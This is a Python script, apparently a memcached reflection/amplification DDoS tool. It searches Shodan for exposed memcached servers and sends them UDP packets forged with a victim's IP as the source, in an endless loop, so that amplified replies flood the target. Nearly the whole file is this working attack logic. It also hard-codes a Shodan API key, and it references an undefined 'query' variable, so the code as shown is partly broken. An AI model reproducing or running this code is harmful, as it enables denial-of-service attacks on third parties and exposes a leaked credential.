#-- coding: utf8 --
#!/usr/bin/env python3
import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

class color:
    HEADER = '\033[0m'


SHODAN_API_KEY = "7xdb7QrxXEqlMRWupdiprzezJMpuhgi5"


while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    print('')
    try:
        print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
        results = api.search('product:"Memcached" port:11211 -has_ipv6:true')
        print('[✓] API Key Authentication: SUCCESS')
        print('[~] Number of bots: %s' % results['total'])
        print('')
        if query.startswith('y'):
            print('')
            target = input("[▸] Enter target IP address: ")
            power = int(input("[▸] Enter preferred power (Default 1): ") or "1")
            data = input("[▸] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
            print('')
            engage = input('[*] Ready to engage target %s? <Y/n>: ' % target).lower()
            if engage.startswith('y'):
                for result in results['matches']:
                    if power>1:
                        print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
                        with suppress_stdout():
                            send(IP(dst='%s' % result['ip_str'], src=target) / UDP(dport=11211)/Raw(load=data), count=power)
                    elif power==1:
                        print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
                        with suppress_stdout():
                            send(IP(dst='%s' % result['ip_str'], src=target)/ UDP(dport=11211)/Raw(load=data), count=power)
                print('')
                print('0.0')
                print('')
                
                while True:
                    results = api.search('-has_ipv6:true product:"Memcached" port:11211')

                    if engage.startswith('y'):
                        for result in results['matches']:
                            if power>1:
                                print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
                                with suppress_stdout():
                                    send(IP(dst='%s' % result['ip_str'], src=target) / UDP(dport=11211)/Raw(load=data), count=power)
                            elif power==1:
                                print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
                                with suppress_stdout():
                                   send(IP(dst='%s' % result['ip_str'], src=target) / UDP(dport=11211)/Raw(load=data), count=power)
                        print('')
                        print('0.0')
                        print('')
            else:
                print('')
                print('[✘] Error: %s not engaged!' % target)
                print('[~] Restarting Platform! Please wait.')
                print('')
        else:
            print('')
            print('[✘] Error: No bots stored locally or remotely on Shodan!')
            print('[~] Restarting Platform! Please wait.')
            print('')

    except shodan.APIError as e:
            print('[✘] Error: %s' % e)
            print('')
            print('[•] Exiting Platform. Have a wonderful day.')
            break
